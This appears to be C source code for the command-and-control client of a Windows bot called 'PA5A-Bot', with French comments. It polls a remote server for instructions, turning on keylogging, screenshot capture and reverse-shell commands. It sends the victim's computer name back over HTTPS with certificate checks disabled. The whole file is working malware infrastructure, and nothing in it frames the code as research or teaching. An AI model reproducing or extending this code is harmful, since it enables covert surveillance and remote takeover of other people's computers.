#include "pa5a.hpp"

EXTERN_C_START

VOID GenerateBoundary(LPSTR buffer, SIZE_T size)
{
	char chaine[] = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	int max = strlen(chaine);
	int i = 0;

	for (i = 0; i < size; i++)
		buffer[i] = chaine[rand() % (max - 1)];

	buffer[i] = 0;
}

/********************************************************************************************************************************************************/
struct CommandsToExecute GetCommands(LPCSTR server, DWORD port)
{
	HINTERNET hSession, hConnect, hRequest;
	LPCSTR acceptTypes[] = {"text/*", NULL};
	CHAR headers[512] = { 0 };
	CHAR data[200000] = { 0 };
	CHAR uuid[256] = { 0 };
	CHAR url[2048] = { 0 };
	CHAR headerBuffer[8192] = { 0 };
	CHAR dataBuffer[8192] = { 0 };
	DWORD headerSize = 0;
	DWORD dataSize = 0;
	struct CommandsToExecute commandsToExecute = { 0 };

	//Construction de l'url
	GetUuid(uuid);
	strcat_s(url, sizeof(url), "/api/clients/");
	strcat_s(url, sizeof(url) - strlen("/api/clients/"), uuid);
	strcat_s(url, sizeof(url) - strlen("/api/clients/") - strlen(uuid), "/commands");

	if ((hSession = InternetOpenA("PA5A-Bot", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0)) == NULL)
	{
		return commandsToExecute;
	}
	if ((hConnect = InternetConnectA(hSession, server, port, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL)) == NULL)
	{
		InternetCloseHandle(hSession);
		return commandsToExecute;
	}
	if ((hRequest = HttpOpenRequestA(hConnect, "GET", url, NULL, NULL, acceptTypes, INTERNET_FLAG_SECURE, 1)) == NULL)
	{
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return commandsToExecute;
	}

	DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
	InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));

	if (HttpSendRequestA(hRequest, NULL, 0, NULL, 0) == FALSE)
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return commandsToExecute;
	}

	//Get the header
	
	headerSize = sizeof(headerBuffer);
	if (HttpQueryInfoA(hRequest, HTTP_QUERY_RAW_HEADERS_CRLF, (LPVOID)headerBuffer, &headerSize, 0) == FALSE)
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return commandsToExecute;
	}

	//Print header
	printf("Headers length = %d\n", headerSize);
	printf("|%s|\n", headerBuffer);

	//(Get the data)
	/*if (InternetQueryDataAvailable(hRequest, &dataSize, 0, 0) == FALSE)
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return FALSE;
	}

	printf("Data length = %d\n", dataSize);*/

	if (InternetReadFile(hRequest, (LPVOID)dataBuffer, sizeof(dataBuffer), &dataSize) == FALSE)
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return commandsToExecute;
	}

	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hSession);

	printf("|%s|\n", dataBuffer);
	printf("Data length = %d\n", dataSize);

	//Print http data
	//printf("|%s|\n", buffer);


	cJSON* commandsArray = NULL;
	commandsArray = cJSON_Parse(dataBuffer);

	cJSON* command = NULL;
	DWORD commandsNumber = 0;

	commandsNumber = cJSON_GetArraySize(commandsArray);
	printf("commandsNumber = %d\n", commandsNumber);

	for (int i = 0; i < commandsNumber; i++)
	{
		//printf("%d\n", i);
		command = cJSON_GetArrayItem(commandsArray, i);

		if (command == NULL)
			continue;

		if (!strncmp(command->valuestring, "KEYLOGS", strlen(command->valuestring)))
			commandsToExecute.keylogs = TRUE;
		else if (!strncmp(command->valuestring, "SCREENSHOT", strlen(command->valuestring)))
			commandsToExecute.screenshot = TRUE;
		else if (!strncmp(command->valuestring, "REVERSE-SHELL", strlen(command->valuestring)))
			commandsToExecute.reverse_shell = TRUE;

		printf("|%s|\n", command->valuestring);

		cJSON_free(command);
	}
	
	return commandsToExecute;
}
/********************************************************************************************************************************************************/
//Fonction qui crée un objet javascript contenant les informations
cJSON* CreateJsonInformationsObject(LPCSTR pcName)
{
	cJSON* object = NULL;
	LPSTR jsonString = NULL;

	object = cJSON_CreateObject();

	cJSON_AddStringToObject(object, "pcName", pcName);

#ifdef DEBUG
	jsonString = cJSON_Print(object);
	printf("%s\n", jsonString);
	free(jsonString);
#endif // DEBUG

	return object;
}
/********************************************************************************************************************************************************/
BOOL sendClientInformations(LPCSTR server, DWORD port)
{
	HINTERNET hSession, hConnect, hRequest;
	LPCSTR acceptTypes[] = { "text/*", NULL };
	CHAR headers[512] = { 0 };
	CHAR data[200000] = { 0 };
	CHAR uuid[256] = { 0 };
	CHAR url[2048] = { 0 };
	CHAR headerBuffer[8192] = { 0 };
	CHAR dataBuffer[8192] = { 0 };
	DWORD headerSize = 0;
	DWORD dataSize = 0;

	strcat_s(headers, sizeof(headers), "Content-Type: application/json");

	CHAR pcName[1024] = { 0 };
	DWORD pcNameSize = sizeof(pcName);
	GetComputerNameA(pcName, &pcNameSize);
	cJSON* informationsObject = NULL;
	informationsObject = CreateJsonInformationsObject(pcName);
	LPSTR jsonString = NULL;

	jsonString = cJSON_Print(informationsObject);

	strcat_s(data, sizeof(data), "\r\n\r\n");
	strcat_s(data, sizeof(data), jsonString);

	//Construction de l'url
	GetUuid(uuid);
	strcat_s(url, sizeof(url), "/api/clients/");
	strcat_s(url, sizeof(url) - strlen("/api/clients/"), uuid);

	if ((hSession = InternetOpenA("PA5A-Bot", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0)) == NULL)
	{
		return FALSE;
	}
	if ((hConnect = InternetConnectA(hSession, server, port, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL)) == NULL)
	{
		InternetCloseHandle(hSession);
		return FALSE;
	}
	if ((hRequest = HttpOpenRequestA(hConnect, "PUT", url, NULL, NULL, acceptTypes, INTERNET_FLAG_SECURE, 1)) == NULL)
	{
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return FALSE;
	}

	DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
	InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));

	if (HttpSendRequestA(hRequest, headers, strlen(headers), data, strlen(data)) == FALSE)
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return FALSE;
	}

	//Get the header
	headerSize = sizeof(headerBuffer);
	if (HttpQueryInfoA(hRequest, HTTP_QUERY_RAW_HEADERS_CRLF, (LPVOID)headerBuffer, &headerSize, 0) == FALSE)
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return FALSE;
	}

	//Print header
	printf("Headers length = %d\n", headerSize);
	printf("|%s|\n", headerBuffer);

	//(Get the data)
	/*if (InternetQueryDataAvailable(hRequest, &dataSize, 0, 0) == FALSE)
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return FALSE;
	}

	printf("Data length = %d\n", dataSize);*/

	if (InternetReadFile(hRequest, (LPVOID)dataBuffer, sizeof(dataBuffer), &dataSize) == FALSE)
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return FALSE;
	}

	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hSession);

	return TRUE;
}


EXTERN_C_END
